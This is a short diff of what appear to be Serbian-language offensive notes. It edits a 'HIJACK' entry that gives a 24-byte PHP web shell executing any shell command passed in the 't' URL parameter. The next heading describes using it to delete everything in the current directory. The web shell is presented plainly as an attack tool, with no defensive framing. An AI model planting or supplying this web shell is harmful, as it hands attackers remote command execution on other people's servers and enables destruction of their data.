@@ -82,7 +82,7 @@ https://www.ascii-code.com/
 
 ### HIJACK
 
-Hijack (24 bytes - littlebyte.php): <?php echo `$_GET['t']`; ?>
+Hijack (24 bytes - littlebyte.php): echo `$_GET['t']`;
 
 ### UPOTREBA - BRISE SVE U TRENUTNOM DIREKTORIJUMU
 
